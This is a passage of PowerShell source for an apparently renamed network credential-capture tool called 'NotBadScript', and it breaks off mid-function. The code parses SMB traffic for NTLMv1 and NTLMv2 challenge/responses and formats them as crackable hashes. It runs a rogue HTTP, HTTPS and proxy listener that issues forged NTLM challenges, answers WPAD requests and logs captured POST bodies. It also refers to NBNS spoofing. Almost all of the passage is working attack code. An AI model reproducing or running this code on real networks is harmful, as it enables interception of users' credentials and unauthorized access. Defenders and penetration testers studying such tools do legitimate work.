if($ShowHelp -eq 'Y')
{
    $notbadscript.status_queue.Add("Run Stop-NotBadScript to stop NotBadScript")  > $null

    if($notbadscript.console_output)
    {
        $notbadscript.status_queue.Add("Press any key to stop real time console output")  > $null
    }

}

if($notbadscript.status_output)
{

    while($notbadscript.status_queue.Count -gt 0)
    {

        switch -Wildcard ($notbadscript.status_queue[0])
        {

            {$_ -like "* Disabled Due To *" -or $_ -like "Run Stop-NotBadScript to stop NotBadScript" -or $_ -like "Windows Firewall = Enabled"}
            {

                if($notbadscript.output_stream_only)
                {
                    Write-Output($notbadscript.status_queue[0] + $notbadscript.newline)
                }
                else
                {
                    Write-Warning($notbadscript.status_queue[0])
                }

                $notbadscript.status_queue.RemoveAt(0)
            }

            default
            {

                if($notbadscript.output_stream_only)
                {
                    Write-Output($notbadscript.status_queue[0] + $notbadscript.newline)
                }
                else
                {
                    Write-Output($notbadscript.status_queue[0])
                }

                $notbadscript.status_queue.RemoveAt(0)
            }

        }

    }

}

# Begin ScriptBlocks

# Shared Basic Functions ScriptBlock
$shared_basic_functions_scriptblock =
{

    function DataToUInt16($field)
    {
	   [Array]::Reverse($field)
	   return [System.BitConverter]::ToUInt16($field,0)
    }

    function DataToUInt32($field)
    {
	   [Array]::Reverse($field)
	   return [System.BitConverter]::ToUInt32($field,0)
    }

    function DataLength2
    {
        param ([Int]$length_start,[Byte[]]$string_extract_data)

        $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)
        return $string_length
    }

    function DataLength4
    {
        param ([Int]$length_start,[Byte[]]$string_extract_data)

        $string_length = [System.BitConverter]::ToUInt32($string_extract_data[$length_start..($length_start + 3)],0)
        return $string_length
    }

    function DataToString
    {
        param ([Int]$string_start,[Int]$string_length,[Byte[]]$string_extract_data)

        $string_data = [System.BitConverter]::ToString($string_extract_data[$string_start..($string_start + $string_length - 1)])
        $string_data = $string_data -replace "-00",""
        $string_data = $string_data.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
        return $string_extract
    }

    function ConvertFrom-PacketOrderedDictionary
    {
        param($packet_ordered_dictionary)

        ForEach($field in $packet_ordered_dictionary.Values)
        {
            $byte_array += $field
        }

        return $byte_array
    }

}

# SMB NTLM Functions ScriptBlock - function for parsing NTLM challenge/response
$SMB_NTLM_functions_scriptblock =
{

    function SMBNTLMChallenge
    {
        param ([Byte[]]$payload_bytes)

        $payload = [System.BitConverter]::ToString($payload_bytes)
        $payload = $payload -replace "-",""
        $NTLM_index = $payload.IndexOf("4E544C4D53535000")

        if($NTLM_index -gt 0 -and $payload.SubString(($NTLM_index + 16),8) -eq "02000000")
        {
            $NTLM_challenge = $payload.SubString(($NTLM_index + 48),16)
        }

        return $NTLM_challenge
    }

    function SMBNTLMResponse
    {
        param ([Byte[]]$payload_bytes)

        $payload = [System.BitConverter]::ToString($payload_bytes)
        $payload = $payload -replace "-",""
        $NTLMSSP_hex_offset = $payload.IndexOf("4E544C4D53535000")

        if($NTLMSSP_hex_offset -gt 0 -and $payload.SubString(($NTLMSSP_hex_offset + 16),8) -eq "03000000")
        {
            $NTLMSSP_offset = $NTLMSSP_hex_offset / 2

            $LM_length = DataLength2 ($NTLMSSP_offset + 12) $payload_bytes
            $LM_offset = DataLength4 ($NTLMSSP_offset + 16) $payload_bytes
            $LM_response = [System.BitConverter]::ToString($payload_bytes[($NTLMSSP_offset + $LM_offset)..($NTLMSSP_offset + $LM_offset + $LM_length - 1)]) -replace "-",""

            $NTLM_length = DataLength2 ($NTLMSSP_offset + 20) $payload_bytes
            $NTLM_offset = DataLength4 ($NTLMSSP_offset + 24) $payload_bytes
            $NTLM_response = [System.BitConverter]::ToString($payload_bytes[($NTLMSSP_offset + $NTLM_offset)..($NTLMSSP_offset + $NTLM_offset + $NTLM_length - 1)]) -replace "-",""

            $domain_length = DataLength2 ($NTLMSSP_offset + 28) $payload_bytes
            $domain_offset = DataLength4 ($NTLMSSP_offset + 32) $payload_bytes
            $NTLM_domain_string = DataToString ($NTLMSSP_offset + $domain_offset) $domain_length $payload_bytes

            $user_length = DataLength2 ($NTLMSSP_offset + 36) $payload_bytes
            $user_offset = DataLength4 ($NTLMSSP_offset + 40) $payload_bytes
            $NTLM_user_string = DataToString ($NTLMSSP_offset + $user_offset) $user_length $payload_bytes

            $host_length = DataLength2 ($NTLMSSP_offset + 44) $payload_bytes
            $host_offset = DataLength4 ($NTLMSSP_offset + 48) $payload_bytes
            $NTLM_host_string = DataToString ($NTLMSSP_offset + $host_offset) $host_length $payload_bytes

            if($NTLM_length -gt 24)
            {
                $NTLMv2_response = $NTLM_response.Insert(32,':')
                $NTLMv2_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLMv2_response

                if($source_IP -ne $IP -and ($notbadscript.machine_accounts -or (!$notbadscript.machine_accounts -and -not $NTLM_user_string.EndsWith('$'))))
                {

                    if($notbadscript.file_output)
                    {
                        $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string)")
                    }

                    if($notbadscript.log_output)
                    {
                        $notbadscript.log.Add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string)")
                    }

                    $notbadscript.NTLMv2_list.Add($NTLMv2_hash)

                    if(!$notbadscript.console_unique -or ($notbadscript.console_unique -and $notbadscript.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string"))
                    {
                        $notbadscript.console_queue.Add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLMv2_hash")
                    }
                    else
                    {
                        $notbadscript.console_queue.Add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLM_domain_string\$NTLM_user_string - not unique")
                    }

                    if($notbadscript.file_output -and (!$notbadscript.file_unique -or ($notbadscript.file_unique -and $notbadscript.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")))
                    {
                        $notbadscript.NTLMv2_file_queue.Add($NTLMv2_hash)
                        $notbadscript.console_queue.Add("SMB NTLMv2 challenge/response written to " + $notbadscript.NTLMv2_out_file)
                    }

                    if($notbadscript.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")
                    {
                        $notbadscript.NTLMv2_username_list.Add("$source_IP $NTLM_domain_string\$NTLM_user_string")
                    }

                    if($notbadscript.IP_capture_list -notcontains $source_IP -and -not $NTLM_user_string.EndsWith('$') -and !$notbadscript.spoofer_repeat -and $source_IP -ne $IP)
                    {
                        $notbadscript.IP_capture_list.Add($source_IP.IPAddressToString)
                    }

                }

            }
            elseif($NTLM_length -eq 24)
            {
                $NTLMv1_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $LM_response + ":" + $NTLM_response + ":" + $NTLM_challenge

                if($source_IP -ne $IP -and ($notbadscript.machine_accounts -or (!$notbadscript.machine_accounts -and -not $NTLM_user_string.EndsWith('$'))))
                {

                    if($notbadscript.file_output)
                    {
                        $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - SMB NTLMv1 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string)")
                    }

                    if($notbadscript.log_output)
                    {
                        $notbadscript.log.Add("$(Get-Date -format 's') - SMB NTLMv1 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string)")
                    }

                    $notbadscript.NTLMv1_list.Add($NTLMv1_hash)

                    if(!$notbadscript.console_unique -or ($notbadscript.console_unique -and $notbadscript.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string"))
                    {
                        $notbadscript.console_queue.Add("$(Get-Date -format 's') SMB NTLMv1 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLMv1_hash")
                    }
                    else
                    {
                        $notbadscript.console_queue.Add("$(Get-Date -format 's') - SMB NTLMv1 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLM_domain_string\$NTLM_user_string - not unique")
                    }

                    if($notbadscript.file_output -and (!$notbadscript.file_unique -or ($notbadscript.file_unique -and $notbadscript.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")))
                    {
                        $notbadscript.NTLMv1_file_queue.Add($NTLMv1_hash)
                        $notbadscript.console_queue.Add("SMB NTLMv1 challenge/response written to " + $notbadscript.NTLMv1_out_file)
                    }

                    if($notbadscript.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")
                    {
                        $notbadscript.NTLMv1_username_list.Add("$source_IP $NTLM_domain_string\$NTLM_user_string")
                    }

                    if($notbadscript.IP_capture_list -notcontains $source_IP -and -not $NTLM_user_string.EndsWith('$') -and !$notbadscript.spoofer_repeat -and $source_IP -ne $IP)
                    {
                        $notbadscript.IP_capture_list.Add($source_IP.IPAddressToString)
                    }

                }

            }

        }

    }

}

# HTTP Server ScriptBlock - HTTP/HTTPS/Proxy listener
$HTTP_scriptblock =
{
    param ($Challenge,$HTTPAuth,$HTTPBasicRealm,$HTTPContentType,$HTTPIP,$HTTPPort,$HTTPDefaultEXE,$HTTPDefaultFile,$HTTPDir,$HTTPResetDelay,$HTTPResetDelayTimeout,$HTTPResponse,
    $HTTPS_listener,$NBNSBruteForcePause,$Proxy,$ProxyIgnore,$proxy_listener,$WPADAuth,$WPADAuthIgnore,$WPADResponse)

    function NTLMChallengeBase64
    {
        param ([String]$Challenge,[Bool]$NTLMESS,[String]$ClientIPAddress,[Int]$ClientPort)

        $HTTP_timestamp = Get-Date
        $HTTP_timestamp = $HTTP_timestamp.ToFileTime()
        $HTTP_timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_timestamp))
        $HTTP_timestamp = $HTTP_timestamp.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

        if($Challenge)
        {
            $HTTP_challenge = $Challenge
            $HTTP_challenge_bytes = $HTTP_challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            $HTTP_challenge_bytes = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $HTTP_challenge = $HTTP_challenge_bytes -replace ' ', ''
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }

        $notbadscript.HTTP_challenge_queue.Add($ClientIPAddress + $ClientPort + ',' + $HTTP_challenge)  > $null

        if($NTLMESS)
        {
            $HTTP_NTLM_negotiation_flags = 0x05,0x82,0x89,0x0a
        }
        else
        {
            $HTTP_NTLM_negotiation_flags = 0x05,0x82,0x81,0x0a
        }

        $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,
                            0x00,0x00,0x00 +
                            $HTTP_NTLM_negotiation_flags +
                            $HTTP_challenge_bytes +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,
                            0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00,0x02,0x00,0x06,0x00,
                            0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,
                            0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00,0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,
                            0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,
                            0x00,0x68,0x00,0x6f,0x00,0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,
                            0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,
                            0x00,0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,
                            0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00 +
                            $HTTP_timestamp +
                            0x00,0x00,0x00,0x00,0x0a,0x0a

        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
        $NTLM = "NTLM " + $NTLM_challenge_base64
        $NTLM_challenge = $HTTP_challenge

        return $NTLM
    }

    if($HTTPS_listener)
    {
        $HTTP_type = "HTTPS"
    }
    elseif($proxy_listener)
    {
        $HTTP_type = "Proxy"
    }
    else
    {
        $HTTP_type = "HTTP"
    }

    if($HTTPIP -ne '0.0.0.0')
    {
        $HTTPIP = [System.Net.IPAddress]::Parse($HTTPIP)
        $HTTP_endpoint = New-Object System.Net.IPEndPoint($HTTPIP,$HTTPPort)
    }
    else
    {
        $HTTP_endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::any,$HTTPPort)
    }

    $HTTP_running = $true
    $HTTP_listener = New-Object System.Net.Sockets.TcpListener $HTTP_endpoint
    $HTTP_client_close = $true

    if($proxy_listener)
    {
        $HTTP_linger = New-Object System.Net.Sockets.LingerOption($true,0)
        $HTTP_listener.Server.LingerState = $HTTP_linger
    }

    try
    {
        $HTTP_listener.Start()
    }
    catch
    {
        $notbadscript.console_queue.Add("$(Get-Date -format 's') - Error starting $HTTP_type listener")
        $HTTP_running = $false

        if($notbadscript.file_output)
        {
            $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - Error starting $HTTP_type listener")
        }

        if($notbadscript.log_output)
        {
            $notbadscript.log.Add("$(Get-Date -format 's') - Error starting $HTTP_type listener")
        }

    }

    :HTTP_listener_loop while($notbadscript.running -and $HTTP_running)
    {
        $TCP_request = ""
        $TCP_request_bytes = New-Object System.Byte[] 4096
        $HTTP_send = $true
        $HTTP_header_content_type = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 + [System.Text.Encoding]::UTF8.GetBytes("text/html")
        $HTTP_header_cache_control = ""
        $HTTP_header_authenticate = ""
        $HTTP_header_authenticate_data = ""
        $HTTP_message = ""
        $HTTP_header_authorization = ""
        $HTTP_header_host = ""
        $HTTP_header_user_agent = ""
        $HTTP_request_raw_URL = ""
        $NTLM = "NTLM"

        while(!$HTTP_listener.Pending() -and !$HTTP_client.Connected)
        {

            Start-Sleep -m 10

            if(!$notbadscript.running)
            {
                break HTTP_listener_loop
            }

        }

        if($HTTPS_listener)
        {

            if(!$HTTP_client.Connected -or $HTTP_client_close -and $notbadscript.running)
            {
                $HTTP_client = $HTTP_listener.AcceptTcpClient()
	            $HTTP_clear_stream = $HTTP_client.GetStream()
                $HTTP_stream = New-Object System.Net.Security.SslStream($HTTP_clear_stream,$false)
                $SSL_cert = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $notbadscript.certificate_CN})
                $HTTP_stream.AuthenticateAsServer($SSL_cert,$false,[System.Security.Authentication.SslProtocols]::Default,$false)
            }

            [Byte[]]$SSL_request_bytes = $null

            do
            {
                $HTTP_request_byte_count = $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length)
                $SSL_request_bytes += $TCP_request_bytes[0..($HTTP_request_byte_count - 1)]
            } while ($HTTP_clear_stream.DataAvailable)

            $TCP_request = [System.BitConverter]::ToString($SSL_request_bytes)
        }
        else
        {

            if(!$HTTP_client.Connected -or $HTTP_client_close -and $notbadscript.running)
            {
                $HTTP_client = $HTTP_listener.AcceptTcpClient()
	            $HTTP_stream = $HTTP_client.GetStream()
            }

            if($HTTP_stream.DataAvailable)
            {
                $HTTP_data_available = $true
            }
            else
            {
                $HTTP_data_available = $false
            }

            while($HTTP_stream.DataAvailable)
            {
                $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length)
            }

            $TCP_request = [System.BitConverter]::ToString($TCP_request_bytes)
        }

        if($TCP_request -like "47-45-54-20*" -or $TCP_request -like "48-45-41-44-20*" -or $TCP_request -like "4f-50-54-49-4f-4e-53-20*" -or $TCP_request -like "43-4f-4e-4e-45-43-54*" -or $TCP_request -like "50-4f-53-54*")
        {
            $HTTP_raw_URL = $TCP_request.Substring($TCP_request.IndexOf("-20-") + 4,$TCP_request.Substring($TCP_request.IndexOf("-20-") + 1).IndexOf("-20-") - 3)
            $HTTP_raw_URL = $HTTP_raw_URL.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $HTTP_request_raw_URL = New-Object System.String ($HTTP_raw_URL,0,$HTTP_raw_URL.Length)
            $HTTP_source_IP = $HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString

            if($NBNSBruteForcePause)
            {
                $notbadscript.NBNS_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
                $notbadscript.hostname_spoof = $true
            }

            if($TCP_request -like "*-48-6F-73-74-3A-20-*")
            {
                $HTTP_header_host_extract = $TCP_request.Substring($TCP_request.IndexOf("-48-6F-73-74-3A-20-") + 19)
                $HTTP_header_host_extract = $HTTP_header_host_extract.Substring(0,$HTTP_header_host_extract.IndexOf("-0D-0A-"))
                $HTTP_header_host_extract = $HTTP_header_host_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $HTTP_header_host = New-Object System.String ($HTTP_header_host_extract,0,$HTTP_header_host_extract.Length)
            }

            if($TCP_request -like "*-55-73-65-72-2D-41-67-65-6E-74-3A-20-*")
            {
                $HTTP_header_user_agent_extract = $TCP_request.Substring($TCP_request.IndexOf("-55-73-65-72-2D-41-67-65-6E-74-3A-20-") + 37)
                $HTTP_header_user_agent_extract = $HTTP_header_user_agent_extract.Substring(0,$HTTP_header_user_agent_extract.IndexOf("-0D-0A-"))
                $HTTP_header_user_agent_extract = $HTTP_header_user_agent_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $HTTP_header_user_agent = New-Object System.String ($HTTP_header_user_agent_extract,0,$HTTP_header_user_agent_extract.Length)

                if($HTTPResetDelay.Count -gt 0 -and ($HTTPResetDelay | Where-Object {$HTTP_header_user_agent -match $_}))
                {
                    $HTTP_reset_delay = $true
                    $HTTP_reset_delay_timeout = New-TimeSpan -Seconds $HTTPResetDelayTimeout
                    $HTTP_reset_delay_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
                }

            }

            if($HTTP_request_raw_URL_old -ne $HTTP_request_raw_URL -or $HTTP_client_handle_old -ne $HTTP_client.Client.Handle)
            {
                $notbadscript.console_queue.Add("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP")
                $notbadscript.console_queue.Add("$(Get-Date -format 's') - $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP")
                $notbadscript.console_queue.Add("$(Get-Date -format 's') - $HTTP_type user agent received from $HTTP_source_IP`:`n$HTTP_header_user_agent")

                if($notbadscript.file_output)
                {
                    $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP")
                    $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP")
                    $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type user agent $HTTP_header_user_agent received from $HTTP_source_IP")
                }

                if($notbadscript.log_output)
                {
                    $notbadscript.log.Add("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP")
                    $notbadscript.log.Add("$(Get-Date -format 's') - $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP")
                    $notbadscript.log.Add("$(Get-Date -format 's') - $HTTP_type user agent $HTTP_header_user_agent received from $HTTP_source_IP")
                }

                if($Proxy -eq 'Y' -and $ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_}))
                {
                    $notbadscript.console_queue.Add("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP")

                    if($notbadscript.file_output)
                    {
                        $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP")
                    }

                    if($notbadscript.log_output)
                    {
                        $notbadscript.log.Add("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP")
                    }

                }

            }

            if($TCP_request -like "*-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-*")
            {
                $HTTP_header_authorization_extract = $TCP_request.Substring($TCP_request.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46)
                $HTTP_header_authorization_extract = $HTTP_header_authorization_extract.Substring(0,$HTTP_header_authorization_extract.IndexOf("-0D-0A-"))
                $HTTP_header_authorization_extract = $HTTP_header_authorization_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $HTTP_header_authorization = New-Object System.String ($HTTP_header_authorization_extract,0,$HTTP_header_authorization_extract.Length)
            }

            if(($HTTP_request_raw_URL -notmatch '/wpad.dat' -and $HTTPAuth -eq 'Anonymous') -or ($HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous') -or (
            $HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -like 'NTLM*' -and $WPADAuthIgnore.Count -gt 0 -and ($WPADAuthIgnore | Where-Object {$HTTP_header_user_agent -match $_})))
            {
                $HTTP_response_status_code = 0x32,0x30,0x30
                $HTTP_response_phrase = 0x4f,0x4b
                $HTTP_client_close = $true
            }
            else
            {

                if(($HTTP_request_raw_url -match '/wpad.dat' -and $WPADAuth -eq 'NTLM') -or ($HTTP_request_raw_url -notmatch '/wpad.dat' -and $HTTPAuth -eq 'NTLM'))
                {
                    $HTTPNTLMESS = $true
                }
                else
                {
                    $HTTPNTLMESS = $false
                }

                if($proxy_listener)
                {
                    $HTTP_response_status_code = 0x34,0x30,0x37
                    $HTTP_header_authenticate = 0x50,0x72,0x6f,0x78,0x79,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }
                else
                {
                    $HTTP_response_status_code = 0x34,0x30,0x31
                    $HTTP_header_authenticate = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }

                $HTTP_response_phrase = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
                $HTTP_client_close = $false
            }

            if($TCP_request -like "50-4f-53-54*")
            {
                $HTTP_POST_request_extract = $TCP_request.Substring($TCP_request.IndexOf("-0D-0A-0D-0A-") + 12)
                $HTTP_POST_request_extract = $HTTP_POST_request_extract.Substring(0,$HTTP_POST_request_extract.IndexOf("-00-"))
                $HTTP_POST_request_extract = $HTTP_POST_request_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $HTTP_POST_request = New-Object System.String ($HTTP_POST_request_extract,0,$HTTP_POST_request_extract.Length)

                if($HTTP_POST_request_old -ne $HTTP_POST_request)
                {
                    $notbadscript.console_queue.Add("$(Get-Date -format 's') - $HTTP_type POST request $HTTP_POST_request captured from $HTTP_source_IP")
                    $notbadscript.POST_request_file_queue.Add($HTTP_POST_request)
                    $notbadscript.POST_request_list.Add($HTTP_POST_request)

                    if($notbadscript.file_output)
                    {
                        $notbadscript.console_queue.Add("$HTTP_type POST request written to " + $notbadscript.POST_request_out_file)
                        $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type POST request captured from $HTTP_source_IP")
                    }

                    if($notbadscript.log_output)
                    {
                        $notbadscript.log.Add("$(Get-Date -format 's') - $HTTP_type POST request captured from $HTTP_source_IP")
                    }

                }

                $HTTP_POST_request_old = $HTTP_POST_request
            }

            if($HTTP_header_authorization.StartsWith('NTLM '))
            {

                $HTTP_header_authorization = $HTTP_header_authorization -replace 'NTLM ',''
                [Byte[]]$HTTP_request_bytes = [System.Convert]::FromBase64String($HTTP_header_authorization)

                if([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '01-00-00-00')
                {
                    $NTLM = NTLMChallengeBase64 $Challenge $HTTPNTLMESS $HTTP_source_IP $HTTP_client.Client.RemoteEndpoint.Port
                }
                elseif([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '03-00-00-00')
                {
                    $HTTP_NTLM_length = DataLength2 20 $HTTP_request_bytes
                    $HTTP_NTLM_offset = DataLength4 24 $HTTP_request_bytes
                    $HTTP_NTLM_domain_length = DataLength2 28 $HTTP_request_bytes
                    $HTTP_NTLM_domain_offset = DataLength4 32 $HTTP_request_bytes
                    [String]$NTLM_challenge = $notbadscript.HTTP_challenge_queue -like $HTTP_source_IP + $HTTP_client.Client.RemoteEndpoint.Port + '*'
                    $notbadscript.HTTP_challenge_queue.Remove($NTLM_challenge)
                    $NTLM_challenge = $NTLM_challenge.Substring(($NTLM_challenge.IndexOf(",")) + 1)

                    if($HTTP_NTLM_domain_length -eq 0)
                    {
                        $HTTP_NTLM_domain_string = ""
                    }
                    else
                    {
                        $HTTP_NTLM_domain_string = DataToString $HTTP_NTLM_domain_offset $HTTP_NTLM_domain_length $HTTP_request_bytes
                    }

                    $HTTP_NTLM_user_length = DataLength2 36 $HTTP_request_bytes
                    $HTTP_NTLM_user_offset = DataLength4 40 $HTTP_request_bytes
                    $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_offset $HTTP_NTLM_user_length $HTTP_request_bytes
                    $HTTP_NTLM_host_length = DataLength2 44 $HTTP_request_bytes
                    $HTTP_NTLM_host_offset = DataLength4 48 $HTTP_request_bytes
                    $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_offset $HTTP_NTLM_host_length $HTTP_request_bytes

                    if($HTTP_NTLM_length -eq 24) # NTLMv1
                    {
                        $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[($HTTP_NTLM_offset - 24)..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                        $NTLM_response = $NTLM_response.Insert(48,':')
                        $HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_response + ":" + $NTLM_challenge

                        if($NTLM_challenge -and $NTLM_response -and ($notbadscript.machine_accounts -or (!$notbadscript.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                        {
                            $notbadscript.NTLMv1_list.Add($HTTP_NTLM_hash)

                            if($notbadscript.file_output)
                            {
                                $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP($HTTP_NTLM_host_string)")
                            }

                            if($notbadscript.log_output)
                            {
                                $notbadscript.log.Add("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP($HTTP_NTLM_host_string)")
                            }

                            if(!$notbadscript.console_unique -or ($notbadscript.console_unique -and $notbadscript.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                            {
                                $notbadscript.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv1 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash")
                            }
                            else
                            {
                                $notbadscript.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv1 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string - not unique")
                            }

                            if($notbadscript.file_output -and (!$notbadscript.file_unique -or ($notbadscript.file_unique -and $notbadscript.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")))
                            {
                                $notbadscript.NTLMv1_file_queue.Add($HTTP_NTLM_hash)
                                $notbadscript.console_queue.Add("$HTTP_type NTLMv1 challenge/response written to " + $notbadscript.NTLMv1_out_file)
                            }

                            if($notbadscript.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")
                            {
                                $notbadscript.NTLMv1_username_list.Add("$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")
                            }

                        }

                    }
                    else # NTLMv2
                    {
                        $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                        $NTLM_response = $NTLM_response.Insert(32,':')
                        $HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLM_response

                        if($NTLM_challenge -and $NTLM_response -and ($notbadscript.machine_accounts -or (!$notbadscript.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                        {
                            $notbadscript.NTLMv2_list.Add($HTTP_NTLM_hash)

                            if($notbadscript.file_output)
                            {
